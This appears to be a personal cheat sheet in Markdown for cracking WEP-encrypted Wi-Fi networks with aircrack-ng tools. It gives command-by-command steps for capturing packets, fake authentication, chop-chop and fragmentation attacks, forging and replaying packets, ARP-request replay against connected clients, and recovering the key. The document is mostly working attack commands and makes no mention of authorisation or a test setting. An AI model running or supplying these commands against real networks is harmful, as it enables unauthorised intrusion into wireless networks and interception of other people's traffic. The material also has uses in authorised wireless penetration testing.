### Capturing Packets
---
Cracking WEP requires around 10000 packets. 30k-40k is optimal.

##### Capturing Packets:
``` sh
sudo airodump -c <channel no.> -b <bssid> -w WEP_capture wlan0mon
```
- Keep Airodump-ng running while doing the below attacks.

### WEP Attacks
---
##### No Clients Connected:
###### Fake authentication Attack:
Some attacks required an associated MAC address of a client. If no clients are connected to the AP, we would need to associate with the AP ourself to perform packet injection.

To associate our MAC to the AP, we can perform a fake-auth attack:
``` sh
sudo aireplay-ng --fakeauth 0 -q 10 -a <AP bssid> -h <Our wlan0mon MAC> wlan0mon
```
or
``` sh
sudo aireplay-ng --fakeauth 6000 -o 1 -q 10 -a <AP bssid> -e <AP essid> -h <Our wlan0mon MAC> wlan0mon
```

> [!note] 
> Note: This attack only works on ***open system authentication (`OSA`)***
> 
> For `SKA`, sniffing / de-auth / cracking is required. (See [shared_key (Aircrack-ng)](https://www.aircrack-ng.org/doku.php?id=shared_key))

###### Chop chop Attack:
```sh
sudo aireplay-ng -4 -b <AP bssid> -h <Our wlan0mon MAC> wlan0mon
```
- Respond with `Y` when an ARP packet is found to use the packet.
- This will generate a XOR file (Decipher key) from the packet.

###### Fragmentation Attack:
```sh
sudo aireplay-ng -5 -b <AP bssid> -h <Our wlan0mon MAC> wlan0mon
```
- Aternative of Chop chop attack
- Always respond with `Y`.
- This will generate a XOR file (Decipher key) from the packet.

###### Packet Forging & Injection
```sh
packetforge-ng -0 -a <AP bssid> -h <Our wlan0mon MAC> -k 255.255.255.255 -l 255.255.255.255 -y <XOR file> -w <output file>
```
- This will forge an packet (`.pcap` file) with the decipher key we just obtained.

```sh
sudo aireplay-ng -2 -r <.pcap file> wlan0mon
```
- `-2` for Interactive Packet Replay attack (Packet Injection).
- This will flood the AP with the packet.
- Remember to keep `airdump-ng` running to capture the packets


##### Existing Clients:
###### Fake Authentication Attack:
If SKA is enabled, we would have to de-authenticate a connected client, and capture the SKA when they reconnect. We can then perform the previous fake authentication attacks. The easier way here is to directly spoof the MAC of the connected client to inject ARP packets, and generate the traffic required to crack the WEP Key.

###### ARP-request replay Attack:
This will generate a huge amount of ARP packets for cracking.
``` sh
sudo aireplay-ng -3 -b <AP bssid> -h <Target Client MAC> wlan0mon
```
- Requires the MAC address of a connected client.

### Cracking WEP Key
---
When we captured over 10k packets, we can try to crack:
``` sh
aircrack-ng WEP-capture.cap
```

